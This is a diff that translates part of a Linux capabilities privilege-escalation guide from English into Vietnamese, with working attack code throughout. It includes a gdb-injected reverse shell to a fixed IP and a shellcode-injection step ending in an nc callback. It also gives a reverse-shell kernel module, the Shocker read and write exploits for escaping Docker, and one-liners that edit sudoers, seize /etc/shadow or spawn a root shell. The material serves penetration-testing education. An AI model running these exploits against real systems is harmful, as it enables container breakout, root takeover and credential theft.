-If **GDB** is installed (or you can install it with `apk add gdb` or `apt install gdb` for example), you can **debug a visible host process** and make it call the `system` function. This needs effective `CAP_SYS_PTRACE` in the target's user namespace and host PID visibility; it does **not** require `CAP_SYS_ADMIN`. Yama, non-dumpable state, seccomp, and LSM policy can still block the attach.
+Nếu đã cài **GDB** (hoặc bạn có thể cài bằng `apk add gdb` hoặc `apt install gdb`, chẳng hạn), bạn có thể **debug một tiến trình host có thể nhìn thấy** và khiến tiến trình đó gọi hàm `system`. Việc này cần `CAP_SYS_PTRACE` hiệu lực trong user namespace của target và khả năng nhìn thấy PID của host; không cần `CAP_SYS_ADMIN`. Yama, trạng thái non-dumpable, seccomp và chính sách LSM vẫn có thể chặn thao tác attach.
 
 ```bash
 gdb -p 1234
@@ -632,14 +632,14 @@ gdb -p 1234
 (gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
 ```
 
-You won’t be able to see the output of the command executed but it will be executed by that process (so get a rev shell).
+Bạn sẽ không thể xem đầu ra của lệnh được thực thi, nhưng lệnh sẽ được tiến trình đó thực thi (vì vậy hãy lấy một rev shell).
 
 > [!WARNING]
-> If you get the error "No symbol "system" in current context." check the previous example loading a shellcode in a program via gdb.
+> Nếu gặp lỗi "No symbol "system" in current context.", hãy xem ví dụ trước đó về cách tải shellcode vào một chương trình thông qua gdb.
 
-**Example with environment (Docker breakout) - Shellcode Injection**
+**Ví dụ với environment (Docker breakout) - Shellcode Injection**
 
-You can check the enabled capabilities inside the docker container using:
+Bạn có thể kiểm tra các capabilities được bật bên trong docker container bằng lệnh:
 
 ```bash
 capsh --print
@@ -654,43 +654,43 @@ gid=0(root)
 groups=0(root
 ```
 
-List **processes** running in the **host** `ps -eaf`
+Liệt kê các **process** đang chạy trên **host** `ps -eaf`
 
-1. Get the **architecture** `uname -m`
-2. Find a **shellcode** for the architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
-3. Find a **program** to **inject** the **shellcode** into a process memory ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
-4. **Modify** the **shellcode** inside the program and **compile** it `gcc inject.c -o inject`
-5. **Inject** it and grab your **shell**: `./inject 299; nc 172.17.0.1 5600`
+1. Lấy **architecture** `uname -m`
+2. Tìm **shellcode** phù hợp với architecture ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
+3. Tìm **program** để **inject** **shellcode** vào bộ nhớ của một process ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
+4. **Chỉnh sửa** **shellcode** trong program rồi **compile** `gcc inject.c -o inject`
+5. **Inject** và lấy **shell** của bạn: `./inject 299; nc 172.17.0.1 5600`
 
 ## CAP_SYS_MODULE
 
-**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** empowers a process to **load and unload kernel modules (`init_module(2)`, `finit_module(2)` and `delete_module(2)` system calls)**, offering direct access to the kernel's core operations. This capability presents critical security risks because loading a module can modify kernel behavior and may defeat isolation boundaries.<sup>[[6]](#references)[[14]](#references)</sup>
-In an ordinary rootful Linux container, this targets the **shared host kernel** and is therefore a direct breakout. The capability must be effective in the initial user namespace, because loading modules is not namespaced. A userspace-kernel or VM-isolated runtime such as gVisor, Kata, or Hyper-V changes which kernel boundary is reachable. Module loading can still be blocked by `modules_disabled`, kernel lockdown, signature enforcement, seccomp, or an LSM.<sup>[[14]](#references)</sup>
+**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** cho phép process **load và unload kernel module (các system call `init_module(2)`, `finit_module(2)` và `delete_module(2))`**, qua đó cung cấp quyền truy cập trực tiếp vào các hoạt động cốt lõi của kernel. Capability này gây ra rủi ro bảo mật nghiêm trọng vì việc load module có thể thay đổi hành vi của kernel và phá vỡ các ranh giới cô lập.<sup>[[6]](#references)[[14]](#references)</sup>
+Trong một Linux container rootful thông thường, thao tác này nhắm vào **kernel dùng chung của host**, do đó có thể trực tiếp thoát khỏi container. Capability phải có hiệu lực trong user namespace ban đầu vì việc load module không được namespace hóa. Runtime sử dụng userspace-kernel hoặc cô lập bằng VM như gVisor, Kata hay Hyper-V sẽ thay đổi ranh giới kernel có thể tiếp cận. Việc load module vẫn có thể bị chặn bởi `modules_disabled`, kernel lockdown, cơ chế thực thi chữ ký, seccomp hoặc LSM.<sup>[[14]](#references)</sup>
 
-**Example with binary**
+**Ví dụ với tệp nhị phân**
 
-In the following example the binary **`python`** has this capability.
+Trong ví dụ sau, tệp nhị phân **`python`** có capability này.
 
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_module+ep
 ```
 
-By default, **`modprobe`** command checks for dependency list and map files in the directory **`/lib/modules/$(uname -r)`**.\
-In order to abuse this, lets create a fake **lib/modules** folder:
+Theo mặc định, lệnh **`modprobe`** kiểm tra các tệp danh sách dependency và map trong thư mục **`/lib/modules/$(uname -r)`**.\
+Để khai thác điều này, hãy tạo một thư mục **lib/modules** giả:
 
 ```bash
 mkdir lib/modules -p
 cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
 ```
 
-Then **compile the kernel module you can find 2 examples below and copy** it to this folder:
+Sau đó, **biên dịch kernel module mà bạn có thể tìm thấy trong 2 ví dụ bên dưới và sao chép** nó vào thư mục này:
 
 ```bash
 cp reverse-shell.ko lib/modules/$(uname -r)/
 ```
 
-Finally, execute the needed python code to load this kernel module:
+Cuối cùng, hãy thực thi đoạn mã Python cần thiết để nạp kernel module này:
 
 ```python
 import kmod
@@ -699,20 +699,20 @@ km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
 km.modprobe("reverse-shell")
 ```
 
-**Example 2 with binary**
+**Ví dụ 2 với binary**
 
-In the following example the binary **`kmod`** has this capability.
+Trong ví dụ sau, binary **`kmod`** có capability này.
 
 ```bash
 getcap -r / 2>/dev/null
 /bin/kmod = cap_sys_module+ep
 ```
 
-Which means that it's possible to use the command **`insmod`** to insert a kernel module. Follow the example below to get a **reverse shell** abusing this privilege.
+Điều đó có nghĩa là có thể dùng lệnh **`insmod`** để nạp một kernel module. Hãy làm theo ví dụ bên dưới để lấy **reverse shell** bằng cách lạm dụng quyền này.
 
-**Example with environment (Docker breakout)**
+**Ví dụ với environment (Docker breakout)**
 
-You can check the enabled capabilities inside the docker container using:
+Bạn có thể kiểm tra các capability được bật bên trong docker container bằng cách dùng:
 
 ```bash
 capsh --print
@@ -727,9 +727,9 @@ gid=0(root)
 groups=0(root)
 ```
 
-Inside the previous output you can see that the **SYS_MODULE** capability is enabled.<sup>[[14]](#references)</sup>
+Trong kết quả trước đó, bạn có thể thấy capability **SYS_MODULE** được bật.<sup>[[14]](#references)</sup>
 
-**Create** the **kernel module** that is going to execute a reverse shell and the **Makefile** to **compile** it:
+**Tạo** **kernel module** sẽ thực thi một reverse shell và **Makefile** để **compile** nó:
 
 ```c:reverse-shell.c
 #include <linux/kmod.h>
@@ -766,9 +766,9 @@ clean:
 ```
 
 > [!WARNING]
-> The blank char before each make word in the Makefile **must be a tab, not spaces**!
+> Ký tự trống trước mỗi từ make trong Makefile **phải là tab, không phải dấu cách**!
 
-Execute `make` to compile it.
+Chạy `make` để biên dịch.
 
 ```bash
 Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.
@@ -777,7 +777,7 @@ sudo apt update
 sudo apt full-upgrade
 ```
 
-Finally, start `nc` inside a shell and **load the module** from another one and you will capture the shell in the nc process:
+Cuối cùng, khởi chạy `nc` trong một shell, rồi **load module** từ một shell khác; bạn sẽ bắt được shell trong tiến trình `nc`:
 
 ```bash
 #Shell 1
@@ -787,20 +787,20 @@ nc -lvnp 4444
 insmod reverse-shell.ko #Launch the reverse shell
 ```
 
-**The code of this technique was copied from the laboratory of "Abusing SYS_MODULE Capability" from** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>
+**Mã của kỹ thuật này được sao chép từ phòng thí nghiệm "Abusing SYS_MODULE Capability" của** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>
 
-Another example of this technique can be found in [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)
+Có thể tìm thấy một ví dụ khác về kỹ thuật này tại [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)
 
 ## CAP_DAC_READ_SEARCH
 
-[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) enables a process to **bypass permissions for reading files and for reading and executing directories**. It also authorizes `open_by_handle_at(2)`, which interprets a valid file handle relative to a mount file descriptor for the same mounted filesystem. It does not automatically expose every file outside the process's mount namespace. A file-handle breakout additionally needs a host-relevant filesystem reference, valid or discoverable handles, a compatible filesystem and storage layout, and no runtime or LSM block. The historical Docker "Shocker" technique demonstrated such a combination in affected layouts, as analyzed [here](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
-**This means that you can bypass file read permission checks and directory read/execute permission checks**.<sup>[[14]](#references)</sup>
+[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) cho phép một tiến trình **bỏ qua quyền đọc tệp và quyền đọc, thực thi thư mục**. Capability này cũng cho phép gọi `open_by_handle_at(2)`, hàm diễn giải một file handle hợp lệ dựa trên file descriptor của mount thuộc cùng filesystem đã được mount. Nó không tự động làm lộ mọi tệp bên ngoài mount namespace của tiến trình. Để thoát khỏi giới hạn bằng file handle, còn cần một tham chiếu filesystem phù hợp với host, các handle hợp lệ hoặc có thể tìm thấy, filesystem và bố cục lưu trữ tương thích, đồng thời không bị runtime hay LSM chặn. Kỹ thuật "Shocker" lịch sử của Docker đã minh họa sự kết hợp này trong một số bố cục bị ảnh hưởng, như phân tích [tại đây](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
+**Điều này có nghĩa là bạn có thể bỏ qua các bước kiểm tra quyền đọc tệp và quyền đọc/thực thi thư mục**.<sup>[[14]](#references)</sup>
 
-For a **custom executable** carrying this capability, inspect what it reads and returns to its caller. A file-scanning helper that accepts a caller-chosen protected pathname and a caller-chosen prefix length, then reveals a full digest of that prefix, can act as a file-read oracle: after recovering the first `n-1` bytes, compare candidate digests for each possible next byte with the helper's digest for length `n`. This does not depend on finding a cryptographic collision or on MD5 specifically; it depends on repeated chosen-length queries and visible, deterministic digests. A whole-file digest without prefix control does not establish the same path. Confirm that the caller can execute the helper, its file capability becomes effective, the chosen path is reachable in its mount namespace, and the input/output behavior really exists. Do not run an unknown privileged helper just to test this during passive enumeration.
+Đối với **custom executable** có capability này, hãy kiểm tra dữ liệu mà nó đọc và trả về cho bên gọi. Một công cụ quét tệp chấp nhận đường dẫn tệp được bảo vệ do bên gọi chọn và độ dài tiền tố do bên gọi chọn, sau đó tiết lộ digest đầy đủ của tiền tố đó, có thể hoạt động như một oracle đọc tệp: sau khi khôi phục `n-1` byte đầu tiên, hãy so sánh digest của các byte tiếp theo có thể có với digest mà công cụ trả về khi dùng độ dài `n`. Cách này không phụ thuộc vào việc tìm ra va chạm mật mã hay cụ thể là MD5; nó phụ thuộc vào các truy vấn lặp lại với độ dài được chọn và digest hiển thị, mang tính xác định. Digest của toàn bộ tệp mà không thể kiểm soát tiền tố không chứng minh được khả năng tương tự. Hãy xác nhận rằng bên gọi có thể thực thi công cụ, file capability của nó có hiệu lực, đường dẫn được chọn có thể truy cập trong mount namespace của nó, và hành vi đầu vào/đầu ra thực sự tồn tại. Đừng chạy một privileged helper không rõ nguồn gốc chỉ để kiểm tra trong quá trình liệt kê thụ động.
 
-**Example with binary**
+**Ví dụ với binary**
 
-The binary can read files that are accessible in its namespaces. So, if a file like `tar` has this capability, it can read the shadow file:
+Binary có thể đọc các tệp truy cập được trong các namespace của nó. Vì vậy, nếu một tệp như `tar` có capability này, nó có thể đọc tệp shadow:
 
 ```bash
 cd /etc
@@ -809,9 +809,9 @@ cd /tmp
 tar -cxf shadow.tar.gz
 ```
 
-**Example with binary2**
+**Ví dụ với binary2**
 
-In this case lets suppose that **`python`** binary has this capability. In order to list root files you could do:
+Trong trường hợp này, giả sử binary **`python`** có capability này. Để liệt kê các tệp trong thư mục root, bạn có thể chạy:
 
 ```python
 import os
@@ -820,15 +820,15 @@ for r, d, f in os.walk('/root'):
         print(filename)
 ```
 
-And in order to read a file you could do:
+Và để đọc một tệp, bạn có thể làm như sau:
 
 ```python
 print(open("/etc/shadow", "r").read())
 ```
 
-**Example in Environment (Docker breakout)**
+**Ví dụ trong môi trường (thoát khỏi Docker)**
 
-You can check the enabled capabilities inside the Docker container using `capsh --print`.<sup>[[14]](#references)[[26]](#references)</sup>
+Bạn có thể kiểm tra các capabilities được bật bên trong Docker container bằng `capsh --print`.<sup>[[14]](#references)[[26]](#references)</sup>
 
 ```
 capsh --print
@@ -843,11 +843,11 @@ gid=0(root)
 groups=0(root)
 ```
 
-Inside the previous output you can see that the **DAC_READ_SEARCH** capability is enabled. This bypasses DAC read/search checks and permits `open_by_handle_at(2)`; it is not a process-debugging capability by itself.<sup>[[14]](#references)</sup>
+Trong kết quả trước, bạn có thể thấy capability **DAC_READ_SEARCH** được bật. Capability này bỏ qua các kiểm tra DAC khi đọc/tìm kiếm và cho phép dùng `open_by_handle_at(2)`; bản thân nó không phải là capability dùng để debug tiến trình.<sup>[[14]](#references)</sup>
 
-You can learn how the following exploit works in [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), but in brief, **CAP_DAC_READ_SEARCH** allows traversing the file system without permission checks and permits `open_by_handle_at(2)`; this can expose files opened by other processes when the relevant namespaces and mounts are reachable.<sup>[[13]](#references)[[14]](#references)</sup>
+Bạn có thể tìm hiểu cách exploit sau hoạt động tại [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), nhưng tóm lại, **CAP_DAC_READ_SEARCH** cho phép duyệt hệ thống tệp mà không cần kiểm tra quyền và cho phép dùng `open_by_handle_at(2)`; điều này có thể làm lộ các tệp được tiến trình khác mở khi có thể truy cập các namespace và mount liên quan.<sup>[[13]](#references)[[14]](#references)</sup>
 
-The original exploit that abuses these permissions to read files from the host can be found here: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); the following is a **modified version that lets you pass the file to read as the first argument and dump the result to a file**.<sup>[[12]](#references)</sup>
+Exploit gốc lợi dụng các quyền này để đọc tệp từ host có thể tìm thấy tại đây: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); sau đây là **phiên bản đã sửa đổi, cho phép bạn truyền tệp cần đọc làm đối số đầu tiên và ghi kết quả vào một tệp**.<sup>[[12]](#references)</sup>
 
 ```c
 #include <stdio.h>
@@ -1000,22 +1000,22 @@ int main(int argc,char* argv[] )
 ```
 
 > [!WARNING]
-> The exploit needs to find a pointer to something mounted on the host. The original exploit used the file /.dockerinit and this modified version uses /etc/hostname. If the exploit isn't working maybe you need to set a different file. To find a file that is mounted in the host just execute mount command:
+> Exploit cần tìm một con trỏ đến thứ gì đó được mount trên host. Exploit gốc sử dụng file /.dockerinit, còn phiên bản đã chỉnh sửa này sử dụng /etc/hostname. Nếu exploit không hoạt động, có thể bạn cần đặt một file khác. Để tìm file được mount trên host, chỉ cần chạy lệnh mount:
 
-![CAP SYS MODULE - CAP DAC READ SEARCH: The exploit needs to find a pointer to something mounted on the host. The original exploit used the file /.dockerinit and this modified version uses...](<../../images/image (407) (1).png>)
+![CAP SYS MODULE - CAP DAC READ SEARCH: Exploit cần tìm một con trỏ đến thứ gì đó được mount trên host. Exploit gốc sử dụng file /.dockerinit, còn phiên bản đã chỉnh sửa này sử dụng...](<../../images/image (407) (1).png>)
 
-**The code of this technique was copied from the laboratory of "Abusing DAC_READ_SEARCH Capability" from** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>
+**Code của kỹ thuật này được sao chép từ phòng lab "Abusing DAC_READ_SEARCH Capability" của** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>
 
 
 ## CAP_DAC_OVERRIDE
 
-**This capability bypasses file read and write permission checks and most execute checks**; executing a regular file still requires at least one execute bit to be set. It does not override a read-only mount, immutable state, or an LSM denial.<sup>[[14]](#references)</sup>
+**Capability này bỏ qua các bước kiểm tra quyền đọc và ghi file, cùng với hầu hết các bước kiểm tra quyền thực thi**; để thực thi một file thông thường, vẫn cần có ít nhất một bit thực thi được đặt. Nó không vô hiệu hóa mount chỉ đọc, trạng thái bất biến hoặc việc LSM từ chối truy cập.<sup>[[14]](#references)</sup>
 
-Look for files that become readable or writable through membership in a privileged group; the useful targets depend on the target's ownership and mode bits.<sup>[[14]](#references)</sup>
+Tìm các file có thể đọc hoặc ghi được nhờ tư cách thành viên của một nhóm đặc quyền; mục tiêu hữu ích tùy thuộc vào chủ sở hữu và các bit quyền của mục tiêu.<sup>[[14]](#references)</sup>
 
-**Example with binary**
+**Ví dụ với binary**
 
-In this example vim has this capability, so you can modify any file like _passwd_, _sudoers_ or _shadow_:
+Trong ví dụ này, vim có capability này, vì vậy bạn có thể chỉnh sửa bất kỳ file nào như _passwd_, _sudoers_ hoặc _shadow_:
 
 ```bash
 getcap -r / 2>/dev/null
@@ -1024,9 +1024,9 @@ getcap -r / 2>/dev/null
 vim /etc/sudoers #To overwrite it
 ```
 
-**Example with binary 2**
+**Ví dụ với binary 2**
 
-In this example **`python`** binary will have this capability. You could use python to override any file:
+Trong ví dụ này, binary **`python`** sẽ có capability này. Bạn có thể dùng python để ghi đè bất kỳ tệp nào:
 
 ```python
 file=open("/etc/sudoers","a")
@@ -1034,12 +1034,12 @@ file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
 file.close()
 ```
 
-**Example with environment + CAP_DAC_READ_SEARCH (Docker breakout)**
+**Ví dụ với environment + CAP_DAC_READ_SEARCH (Docker breakout)**
 
-`CAP_DAC_READ_SEARCH` permits `open_by_handle_at(2)`, but does **not** bypass write permission checks. Writing through a resolved handle additionally requires write access for the process's effective filesystem UID/GID or ACL, or `CAP_DAC_OVERRIDE`. The host-relevant filesystem reference, supported file handles, writable mount, and runtime/LSM policy must also permit the operation. Check the effective capabilities and identity; neither capability alone proves a writable host target. See [capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html) and [open_by_handle_at(2)](https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html).<sup>[[14]](#references)[[26]](#references)</sup>
+`CAP_DAC_READ_SEARCH` cho phép dùng `open_by_handle_at(2)`, nhưng **không** bỏ qua các kiểm tra quyền ghi. Để ghi thông qua handle đã được phân giải, tiến trình còn cần quyền truy cập ghi theo effective filesystem UID/GID hoặc ACL, hoặc cần `CAP_DAC_OVERRIDE`. Tham chiếu filesystem liên quan đến host, các file handle được hỗ trợ, mount có thể ghi và chính sách runtime/LSM cũng phải cho phép thao tác này. Kiểm tra effective capabilities và danh tính; chỉ riêng capability không chứng minh được rằng có thể ghi vào mục tiêu trên host. Xem [capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html) và [open_by_handle_at(2)](https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html).<sup>[[14]](#references)[[26]](#references)</sup>
 
-First of all read the previous section that [**abuses DAC_READ_SEARCH capability to read arbitrary files**](linux-capabilities.md#cap_dac_read_search) of the host and **compile** the exploit.\
-The following historical sample attempts to open a resolved file with `O_RDWR`; it succeeds only when the preceding filesystem and write-permission conditions hold:
+Trước hết, hãy đọc phần trước về [**abuses DAC_READ_SEARCH capability to read arbitrary files**](linux-capabilities.md#cap_dac_read_search) trên host và **biên dịch** exploit.\
+Mẫu lịch sử sau cố gắng mở một file đã được phân giải bằng `O_RDWR`; thao tác chỉ thành công khi các điều kiện về filesystem và quyền ghi nêu trên được đáp ứng:
 
 ```c
 #include <stdio.h>
@@ -1180,23 +1180,23 @@ int main(int argc, char * argv[]) {
 }
 ```
 
-In order to scape the docker container you could **download** the files `/etc/shadow` and `/etc/passwd` from the host, **add** to them a **new user**, and use **`shocker_write`** to overwrite them. Then, **access** via **ssh**.
+Để **thoát** khỏi Docker container, bạn có thể **tải xuống** các tệp `/etc/shadow` và `/etc/passwd` từ host, **thêm** một **user mới** vào chúng, rồi dùng **`shocker_write`** để ghi đè chúng. Sau đó, **truy cập** qua **ssh**.
 
-**The code of this technique was copied from the laboratory of "Abusing DAC_OVERRIDE Capability" from** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>
+**Code của kỹ thuật này được sao chép từ phòng lab "Abusing DAC_OVERRIDE Capability" của** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>
 
 ## CAP_CHOWN
 
-**This capability allows a process to change the ownership of files**.<sup>[[14]](#references)</sup>
+**Capability này cho phép một process thay đổi quyền sở hữu các tệp**.<sup>[[14]](#references)</sup>
 
-**Example with binary**
+**Ví dụ với binary**
 
-Lets suppose the **`python`** binary has this capability; you can change the owner of a file such as **`shadow`**, then use the resulting access to modify it if other permissions allow:
+Giả sử binary **`python`** có capability này; bạn có thể thay đổi chủ sở hữu của một tệp như **`shadow`**, sau đó tận dụng quyền truy cập có được để chỉnh sửa tệp nếu các quyền khác cho phép:
 
 ```bash
 python -c 'import os;os.chown("/etc/shadow",1000,1000)'
 ```
 
-Or with the **`ruby`** binary having this capability:
+Hoặc với binary **`ruby`** có capability này:
 
 ```bash
 ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
@@ -1204,11 +1204,11 @@ ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
 
 ## CAP_FOWNER
 
-**This capability bypasses ownership checks for many file operations, including changing permissions**.<sup>[[14]](#references)</sup>
+**Capability này bỏ qua các kiểm tra quyền sở hữu đối với nhiều thao tác trên tệp, bao gồm cả việc thay đổi quyền**.<sup>[[14]](#references)</sup>
 
-**Example with binary**
+**Ví dụ với binary**
 
-If python has this capability you can modify the permissions of the shadow file, **change root password**, and escalate privileges:
+Nếu python có capability này, bạn có thể sửa quyền của tệp shadow, **thay đổi mật khẩu root** và leo thang đặc quyền:
 
 ```bash
 python -c 'import os; os.chmod("/etc/shadow", 0o666)'
@@ -1216,11 +1216,11 @@ python -c 'import os; os.chmod("/etc/shadow", 0o666)'
 
 ### CAP_SETUID
 
-**This capability allows a process to change its effective user ID, subject to the credential and capability rules enforced by the kernel**.<sup>[[14]](#references)</sup>
+**Capability này cho phép một process thay đổi user ID hiệu lực của nó, tùy thuộc vào các quy tắc về thông tin xác thực và capability do kernel thực thi**.<sup>[[14]](#references)</sup>
 
-**Example with binary**
+**Ví dụ với binary**
 
-If python has this **capability**, you can very easily abuse it to escalate privileges to root:
+Nếu python có **capability** này, bạn có thể dễ dàng lạm dụng nó để leo thang đặc quyền lên root:
 
 ```python
 import os
@@ -1228,7 +1228,7 @@ os.setuid(0)
 os.system("/bin/bash")
 ```
 
-**Another way:**
+**Một cách khác:**
 
 ```python
 import os
@@ -1239,17 +1239,17 @@ os.setuid(0)
 os.system("/bin/bash")
 ```
 
-For a **custom** executable with effective `CAP_SETUID`, inspect the reachable code path instead of assuming the capability alone grants a shell. Caller-controlled text passed as the *format string* to [`printf`](https://man7.org/linux/man-pages/man3/printf.3.html) can expose or alter process memory; a useful privilege transition still depends on a vulnerable call, controllable input, and a later action after `setuid(0)`. If that action launches an external helper by name, verify the effective identity at the launch, the actual `PATH`, and whether an earlier searched directory is writable and traversable by the caller. An ineffective file capability, `no_new_privs`, a fixed trusted helper path, or an unreachable branch changes the result. Review the binary or available source offline; do not invoke a suspicious privileged helper during routine enumeration.
+Đối với một executable **custom** có `CAP_SETUID` hiệu lực, hãy kiểm tra code path có thể tiếp cận thay vì cho rằng chỉ riêng capability này đã cấp quyền chạy shell. Văn bản do caller kiểm soát được truyền làm *format string* cho [`printf`](https://man7.org/linux/man-pages/man3/printf.3.html) có thể làm lộ hoặc thay đổi bộ nhớ của process; để chuyển quyền thành công vẫn cần có lời gọi dễ bị khai thác, input có thể kiểm soát và một hành động tiếp theo sau `setuid(0)`. Nếu hành động đó khởi chạy một helper bên ngoài bằng tên, hãy xác minh danh tính hiệu lực tại thời điểm khởi chạy, `PATH` thực tế và liệu caller có thể ghi và truy cập một thư mục được tìm kiếm trước đó hay không. File capability không hiệu lực, `no_new_privs`, đường dẫn helper cố định và đáng tin cậy hoặc một nhánh không thể tiếp cận đều làm thay đổi kết quả. Hãy kiểm tra binary hoặc source có sẵn khi offline; không gọi một privileged helper đáng ngờ trong quá trình liệt kê thông thường.
 
 ## CAP_SETGID
 
-**This capability allows a process to change its effective group ID, subject to the credential and capability rules enforced by the kernel**.<sup>[[14]](#references)</sup>
+**Capability này cho phép một process thay đổi group ID hiệu lực, tùy thuộc vào các quy tắc về credentials và capability do kernel thực thi**.<sup>[[14]](#references)</sup>
 
-There are a lot of files you can **overwrite to escalate privileges,** [**you can get ideas from here**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
+Có rất nhiều file bạn có thể **ghi đè để leo thang đặc quyền,** [**bạn có thể tham khảo ý tưởng tại đây**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).
 
-**Example with binary**
+**Ví dụ với binary**
 
-In this case you should look for interesting files that a group can read because you can impersonate any group:
+Trong trường hợp này, bạn nên tìm các file thú vị mà một group có thể đọc vì bạn có thể giả danh bất kỳ group nào:
 
 ```bash
 #Find every file writable by a group
@@ -1260,7 +1260,7 @@ find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
 find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
 ```
 
-Once you have find a file you can abuse (via reading or writing) to escalate privileges you can **get a shell impersonating the interesting group** with:
+Sau khi tìm được một tệp có thể khai thác (thông qua đọc hoặc ghi) để leo thang đặc quyền, bạn có thể **lấy shell với danh tính của nhóm đáng chú ý** bằng cách:
 
 ```python
 import os
@@ -1268,19 +1268,19 @@ os.setgid(42)
 os.system("/bin/bash")
 ```
 
-In this case the group shadow was impersonated so you can read the file `/etc/shadow`:
+Trong trường hợp này, nhóm shadow đã bị giả mạo, vì vậy bạn có thể đọc tệp `/etc/shadow`:
 
 ```bash
 cat /etc/shadow
 ```
 
-### Combined chain: CAP_SETGID + CAP_CHOWN
+### Chuỗi kết hợp: CAP_SETGID + CAP_CHOWN
 
-When both capabilities are available in the same helper, a practical chain is:
+Khi có cả hai capability trong cùng một helper, một chuỗi thực tế là:
 
-1. Switch EGID to `shadow` (or another privileged group).
-2. Use `chown` on `/etc/shadow` to set your UID while keeping group `shadow`.
-3. Read a target hash and crack/pivot.
+1. Chuyển EGID sang `shadow` (hoặc một group có đặc quyền khác).
+2. Dùng `chown` trên `/etc/shadow` để đặt UID của bạn, đồng thời giữ group là `shadow`.
+3. Đọc hash mục tiêu rồi crack/pivot.
 
 ```python
 import os
@@ -1294,17 +1294,17 @@ os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
 os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
 ```
 
-This avoids needing full root directly and is commonly enough to pivot through credential reuse.
+Điều này giúp tránh cần trực tiếp có toàn quyền root và thường là đủ để pivot thông qua việc tái sử dụng thông tin xác thực.
 
-If **docker** is installed you could **impersonate** the **docker group** and abuse it to communicate with the [**docker socket** and escalate privileges](#writable-docker-socket).
+Nếu đã cài **docker**, bạn có thể **giả mạo** nhóm **docker** và lạm dụng nhóm này để giao tiếp với [**docker socket** và leo thang đặc quyền](#writable-docker-socket).
 
 ## CAP_SETFCAP
 
-**This capability allows a process to set file capabilities**.<sup>[[14]](#references)</sup>
+**Capability này cho phép một tiến trình thiết lập file capability**.<sup>[[14]](#references)</sup>
 
-**Example with binary**
+**Ví dụ với binary**
 
-If python has this **capability**, you can very easily abuse it to escalate privileges to root:
+Nếu python có **capability** này, bạn có thể rất dễ lạm dụng nó để leo thang đặc quyền lên root:
 
 ```python:setcapability.py
 import ctypes, sys
@@ -1334,14 +1334,14 @@ python setcapability.py /usr/bin/python2.7
 ```
 
 > [!WARNING]
-> A newly written file capability set replaces the previous set; if the helper is then executed with only the new capabilities, it may no longer retain `CAP_SETFCAP` to update another file.<sup>[[14]](#references)[[25]](#references)</sup>
+> Một capability set mới được ghi vào file sẽ thay thế set trước đó; nếu sau đó helper chỉ được thực thi với các capability mới, nó có thể không còn giữ `CAP_SETFCAP` để cập nhật file khác.<sup>[[14]](#references)[[25]](#references)</sup>
 
-Once you have [SETUID capability](linux-capabilities.md#cap_setuid) you can go to its section to see how to escalate privileges.
+Sau khi có [SETUID capability](linux-capabilities.md#cap_setuid), bạn có thể xem phần tương ứng để biết cách leo thang đặc quyền.
 
-**Example with environment (Docker breakout)**
